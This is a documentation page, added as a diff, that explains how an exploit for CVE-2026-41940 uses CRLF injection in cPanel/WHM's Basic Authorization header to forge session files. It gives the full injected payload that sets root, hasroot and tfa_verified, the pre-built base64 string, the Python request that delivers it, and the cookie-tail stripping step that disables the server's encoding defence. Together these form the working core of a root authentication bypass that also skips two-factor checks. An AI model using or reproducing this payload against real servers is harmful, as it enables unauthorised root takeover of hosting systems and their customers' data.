@@ -1,0 +1,108 @@
+---
+title: "CRLF injection in WHM Authorization header parsing"
+description: "How CVE-2026-41940 exploits CRLF sequences in the Basic Authorization header to inject forged authentication fields into cPanel/WHM session files."
+---
+
+CRLF injection is the core primitive that makes the CVE-2026-41940 bypass possible. cpsrvd decodes the value of the `Authorization: Basic` header and writes it directly into the session file on disk — without sanitizing carriage return (`\r`) or line feed (`\n`) characters. An attacker who controls that header value can append arbitrary `key=value` lines to the session file, including fields that grant root-level authenticated status.
+
+<Note>
+  This technique is similar in structure to HTTP response splitting, but the target is a file write operation rather than an HTTP response buffer. Instead of splitting an HTTP response to inject headers, the attacker splits a session file to inject authentication fields.
+</Note>
+
+## What is CRLF injection?
+
+HTTP headers use `\r\n` (carriage return + line feed, ASCII 0x0D 0x0A) as line terminators. When user-controlled data that contains literal `\r\n` bytes is written to any newline-delimited storage format without stripping those bytes first, the attacker gains control over field boundaries.
+
+In the context of CVE-2026-41940:
+
+- The `Authorization: Basic <base64>` header carries a base64-encoded value
+- cpsrvd decodes the base64 value and writes it into the session file
+- The session file uses newline-delimited `key=value` pairs
+- Embedding `\r\n` sequences in the base64 payload inserts new lines — and therefore new fields — into the session file
+
+## The session file format
+
+WHM session files are stored on disk as newline-delimited `key=value` records, keyed by the `whostmgrsession` cookie value. Authentication checks read fields from this file (via the parsed session cache) to determine identity and privilege level.
+
+Relevant fields:
+
+| Field | Purpose |
+|---|---|
+| `user` | The authenticated username |
+| `hasroot` | Flag granting root-level WHM access |
+| `tfa_verified` | Marks two-factor authentication as completed |
+| `successful_internal_auth_with_timestamp` | Timestamp of successful internal authentication |
+
+By injecting all four fields with attacker-chosen values, the tool forges a fully authenticated root session. The decoded payload written by stage 2 is:
+
+```text
+root:x
+successful_internal_auth_with_timestamp=9999999999
+user=root
+tfa_verified=1
+hasroot=1
+```
+
+The first line (`root:x`) is the normal `user:password` component of a Basic auth credential. Everything after the first `\r\n` is injected content that the server appends verbatim to the session file.
+
+## The injection vector
+
+The `Authorization: Basic` header is the delivery mechanism. The base64-encoded payload (`PAYLOAD_B64`) encodes the `\r\n` sequences as part of the credential string:
+
+```python
+# pre-built base64 of:
+#   root:x\r\nsuccessful_internal_auth_with_timestamp=9999999999\r\nuser=root\r\ntfa_verified=1\r\nhasroot=1
+PAYLOAD_B64 = (
+    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
+    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
+)
+```
+
+`DQo` in base64 decodes to `\r\n` (0x0D 0x0A). Each occurrence in `PAYLOAD_B64` is a field separator in the resulting session file write.
+
+The header is sent as part of the stage 2 GET request:
+
+```python
+r = http(s, "GET", scheme, host, port, canonical, "/",
+         headers={
+             "Authorization": f"Basic {PAYLOAD_B64}",
+             "Cookie": f"whostmgrsession={cookie_enc}",
+         })
+```
+
+cpsrvd processes the `Authorization` header, base64-decodes the value, and writes the result into the session file identified by the `whostmgrsession` cookie. The injected `\r\n` bytes are preserved, inserting the forged authentication fields as separate lines in the file.
+
+## Why the obfuscation tail matters
+
+The `whostmgrsession` cookie issued by cpsrvd normally includes a `,<obhex>` suffix — an obfuscation marker used by cpsrvd's Authorization header processing path. When this marker is present, cpsrvd follows a different code path that re-encodes the Authorization value before writing it to the session file, encoding the `\r\n` bytes and defeating the injection.
+
+Stripping the `,` tail before sending the cookie causes cpsrvd to follow the non-encoding code path, writing the raw decoded value — including the embedded newlines — directly to disk.
+
+Stage 1 performs this strip explicitly:
+
+```python
+# strip the ",<obhex>" tail. that's what makes the encoder skip pass on stage 2.
+if "," in cookie_value:
+    session_base = cookie_value.split(",", 1)[0]
+else:
+    session_base = cookie_value
+```
+
+The resulting `session_base` is then URL-encoded when placed in the `Cookie` header, ensuring it is transmitted correctly while the obfuscation code path remains inactive:
+
+```python
+cookie_enc = urllib.parse.quote(session_base)
+```
+
+<Warning>
+  The obfuscation tail strip is not optional. Sending the unmodified cookie value will cause cpsrvd to encode the Authorization payload, writing a single non-injected line to the session file. Stage 3 will then promote a non-forged session, and stage 4 will fail.
+</Warning>
+
+<CardGroup cols={2}>
+  <Card title="Exploit chain overview" icon="list-ordered" href="/technical/exploit-chain">
+    All four stages and how they chain together end to end.
+  </Card>
+  <Card title="Session file and cache architecture" icon="database" href="/technical/session-mechanics">
+    Why writing the raw file is only half the work — and what stage 3 does about it.
+  </Card>
+</CardGroup>
